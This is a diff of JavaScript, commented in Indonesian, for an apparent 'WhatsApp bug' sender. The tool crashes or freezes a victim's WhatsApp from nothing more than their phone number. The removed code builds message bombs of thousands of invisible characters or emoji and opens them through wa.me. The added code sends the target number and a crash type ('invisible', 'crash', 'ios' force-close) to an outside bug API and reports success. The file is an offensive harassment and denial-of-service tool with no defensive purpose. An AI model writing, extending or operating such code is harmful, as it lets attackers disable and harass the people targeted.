@@ -23,9 +23,29 @@ if(location.pathname.endsWith('index.html') && !localStorage.getItem('logged'))
 function logout(){ localStorage.removeItem('logged'); location='login.html'; }
 
 // Kirim bug WA
-function kirim(t){
-  const no = document.getElementById('target').value.trim();
-  if(!no) return alert('Masukkan nomor!');
-  let teks = t==='invisible'?'‎'.repeat(1000): t==='crash'?'💥'.repeat(3000):'🐱‍👤'.repeat(4000);
-  window.open(`https://wa.me/${no}?text=${encodeURIComponent(teks)}`, '_blank');
+async function kirim(tipe) {
+  const target = document.getElementById("target").value.trim();
+  if (!target) return alert("Masukkan nomor terlebih dahulu!");
+  
+  const typeMap = {
+    invisible: "1",
+    crash: "2",
+    ios: "1" // Misalnya ios pakai fc1 juga
+  };
+  
+  const type = typeMap[tipe] || "1";
+  
+  try {
+    const res = await fetch(`https://bug-api.repl.co/radzzoffc?chatId=${target}&type=${type}`);
+    const result = await res.json();
+    
+    if (result.success) {
+      alert(`✅ Bug "${tipe}" berhasil dikirim ke ${target}`);
+    } else {
+      alert("❌ Gagal mengirim bug: " + (result.error || "Unknown error"));
+    }
+  } catch (err) {
+    console.error(err);
+    alert("❌ Gagal kirim. Periksa koneksi atau API.");
+  }
 }
